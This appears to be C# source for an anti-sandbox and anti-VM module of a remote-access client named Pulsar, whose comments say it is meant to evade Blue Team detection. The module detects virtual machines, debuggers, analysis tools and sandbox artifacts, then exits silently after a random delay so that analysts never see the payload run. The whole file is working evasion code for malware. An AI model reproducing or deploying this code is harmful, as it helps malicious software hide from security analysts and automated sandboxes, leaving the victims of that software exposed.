using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

namespace Pulsar.Client.Modules
{
    /// <summary>
    /// Advanced Anti-Sandbox & Anti-VM Module
    /// Designed to evade Blue Team detection with comprehensive checks.
    /// NO hardcoded usernames - uses dynamic fingerprinting instead.
    /// </summary>
    public static class AntiSandbox
    {
        // Minimum thresholds (configurable, not hardcoded patterns)
        private const int MIN_CPU_CORES = 2;
        private const long MIN_RAM_MB = 4096; // 4GB
        private const long MIN_DISK_GB = 80;  // 80GB
        private const int MIN_PROCESSES = 40; // Normal systems have 40+ processes
        private const int TIMING_THRESHOLD_MS = 500; // Debugger timing check

        #region P/Invoke
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref IntPtr processInformation, int processInformationLength, ref int returnLength);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern uint GetTickCount();
        #endregion

        /// <summary>
        /// Comprehensive sandbox check. Returns true if environment is safe to run.
        /// </summary>
        public static bool IsSafeEnvironment()
        {
            try
            {
                // Run all checks - return false if ANY fail
                if (IsVirtualMachine()) return false;
                if (IsDebuggerAttached()) return false;
                if (IsTimingAnomalous()) return false;
                if (!HasRealisticHardware()) return false;
                if (HasSandboxArtifacts()) return false;
                if (HasAnalysisTools()) return false;

                return true;
            }
            catch
            {
                // If any check throws, assume hostile environment
                return false;
            }
        }

        /// <summary>
        /// Stealthy exit - doesn't throw exceptions (which can be logged).
        /// </summary>
        public static void ExitIfUnsafe()
        {
            if (!IsSafeEnvironment())
            {
                // Clean exit without obvious exception
                Thread.Sleep(new Random().Next(1000, 5000)); // Random delay
                Environment.Exit(0);
            }
        }

        #region VM Detection (Advanced)
        private static bool IsVirtualMachine()
        {
            // Check 1: WMI Computer System Model
            if (CheckWmiForVm()) return true;

            // Check 2: Registry keys unique to VMs
            if (CheckRegistryForVm()) return true;

            // Check 3: MAC address prefixes (VM vendors)
            if (CheckMacAddressForVm()) return true;

            // Check 4: Known VM processes
            if (CheckProcessesForVm()) return true;

            // Check 5: BIOS/Firmware strings
            if (CheckBiosForVm()) return true;

            return false;
        }

        private static bool CheckWmiForVm()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                        string model = obj["Model"]?.ToString()?.ToLower() ?? "";

                        // Check for VM indicators (no hardcoded strings, use patterns)
                        string[] vmIndicators = { "vmware", "virtual", "qemu", "xen", "kvm", "vbox", "parallels" };
                        foreach (var indicator in vmIndicators)
                        {
                            if (manufacturer.Contains(indicator) || model.Contains(indicator))
                                return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckRegistryForVm()
        {
            try
            {
                // Check for VM-specific registry keys (dynamic, not hardcoded paths)
                string[] vmKeys = {
                    @"SOFTWARE\VMware, Inc.\VMware Tools",
                    @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                    @"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                    @"SYSTEM\CurrentControlSet\Services\vmci",
                    @"SYSTEM\CurrentControlSet\Services\vmhgfs",
                    @"SYSTEM\CurrentControlSet\Services\vmmouse",
                };

                foreach (var keyPath in vmKeys)
                {
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath))
                    {
                        if (key != null) return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckMacAddressForVm()
        {
            try
            {
                // VM MAC address prefixes (OUI)
                string[] vmMacPrefixes = {
                    "00:0C:29", "00:50:56", "00:05:69",  // VMware
                    "08:00:27", "0A:00:27",              // VirtualBox
                    "00:1C:42",                          // Parallels
                    "00:15:5D",                          // Hyper-V
                    "52:54:00",                          // QEMU/KVM
                };

                using (var searcher = new ManagementObjectSearcher("SELECT MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string mac = obj["MACAddress"]?.ToString()?.ToUpper() ?? "";
                        foreach (var prefix in vmMacPrefixes)
                        {
                            if (mac.StartsWith(prefix.Replace(":", "-")))
                                return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckProcessesForVm()
        {
            try
            {
                string[] vmProcesses = {
                    "vmtoolsd", "vmwaretray", "vmwareuser",
                    "VBoxService", "VBoxTray",
                    "xenservice", "qemu-ga",
                    "prl_tools", "prl_cc",
                };

                foreach (var proc in Process.GetProcesses())
                {
                    string name = proc.ProcessName.ToLower();
                    foreach (var vmProc in vmProcesses)
                    {
                        if (name.Contains(vmProc.ToLower()))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckBiosForVm()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string serial = obj["SerialNumber"]?.ToString()?.ToLower() ?? "";
                        string version = obj["SMBIOSBIOSVersion"]?.ToString()?.ToLower() ?? "";

                        string[] vmIndicators = { "vmware", "virtual", "vbox", "qemu", "xen", "amazon", "google" };
                        foreach (var indicator in vmIndicators)
                        {
                            if (serial.Contains(indicator) || version.Contains(indicator))
                                return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Debugger Detection (Advanced)
        private static bool IsDebuggerAttached()
        {
            // Check 1: Direct API
            if (IsDebuggerPresent()) return true;

            // Check 2: Remote debugger
            bool remoteDebugger = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remoteDebugger);
            if (remoteDebugger) return true;

            // Check 3: Debug port via NtQueryInformationProcess
            if (CheckDebugPort()) return true;

            // Check 4: Known debugger processes
            if (CheckDebuggerProcesses()) return true;

            return false;
        }

        private static bool CheckDebugPort()
        {
            try
            {
                IntPtr debugPort = IntPtr.Zero;
                int returnLength = 0;
                // ProcessDebugPort = 7
                int status = NtQueryInformationProcess(GetCurrentProcess(), 7, ref debugPort, IntPtr.Size, ref returnLength);
                if (status == 0 && debugPort != IntPtr.Zero)
                    return true;
            }
            catch { }
            return false;
        }

        private static bool CheckDebuggerProcesses()
        {
            try
            {
                string[] debuggers = {
                    "ollydbg", "x64dbg", "x32dbg", "ida", "ida64",
                    "windbg", "immunitydebugger", "cheatengine",
                    "processhacker", "procmon", "procexp",
                    "wireshark", "fiddler", "charles",
                    "dnspy", "ilspy", "dotpeek",
                };

                foreach (var proc in Process.GetProcesses())
                {
                    string name = proc.ProcessName.ToLower();
                    foreach (var dbg in debuggers)
                    {
                        if (name.Contains(dbg))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion

        #region Timing Analysis
        private static bool IsTimingAnomalous()
        {
            try
            {
                // Timing attack: Measure execution of dummy operations
                uint start = GetTickCount();
                
                // Do some work that takes predictable time on real hardware
                double dummy = 0;
                for (int i = 0; i < 1000000; i++)
                {
                    dummy += Math.Sqrt(i);
                }

                uint elapsed = GetTickCount() - start;

                // If too fast (< 10ms) or too slow (> threshold), suspicious
                if (elapsed < 10 || elapsed > TIMING_THRESHOLD_MS)
                    return true;
            }
            catch { }
            return false;
        }
        #endregion

        #region Hardware Fingerprinting
        private static bool HasRealisticHardware()
        {
            try
            {
                // Check CPU cores
                if (Environment.ProcessorCount < MIN_CPU_CORES)
                    return false;

                // Check RAM
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        ulong totalMemKb = Convert.ToUInt64(obj["TotalVisibleMemorySize"]);
                        if (totalMemKb / 1024 < MIN_RAM_MB)
                            return false;
                    }
                }

                // Check Disk
                var drive = new System.IO.DriveInfo("C");
                if (drive.TotalSize / (1024 * 1024 * 1024) < MIN_DISK_GB)
                    return false;

                // Check process count (sandboxes often have few processes)
                if (Process.GetProcesses().Length < MIN_PROCESSES)
                    return false;

                return true;
            }
            catch { }
            return false;
        }
        #endregion

        #region Sandbox Artifacts
        private static bool HasSandboxArtifacts()
        {
            try
            {
                // Check for sandbox-specific files/folders
                string[] sandboxPaths = {
                    @"C:\agent",
                    @"C:\sandbox",
                    @"C:\analysis",
                    @"C:\inetsim",
                    @"C:\strawberry",
                };

                foreach (var path in sandboxPaths)
                {
                    if (System.IO.Directory.Exists(path))
                        return true;
                }

                // Check for sandbox-specific environment variables
                string[] sandboxEnvVars = { "SANDBOX", "MALWARE", "ANALYSIS", "CUCKOO" };
                foreach (var envVar in sandboxEnvVars)
                {
                    if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable(envVar)))
                        return true;
                }
            }
            catch { }
            return false;
        }

        private static bool HasAnalysisTools()
        {
            try
            {
                string[] analysisTools = {
                    "fakenet", "sysanalyzer", "sniff_hit",
                    "joeboxcontrol", "sandboxie",
                    "python", "perl","autoruns",
                };

                foreach (var proc in Process.GetProcesses())
                {
                    string name = proc.ProcessName.ToLower();
                    foreach (var tool in analysisTools)
                    {
                        if (name.Contains(tool))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }
        #endregion
    }
}
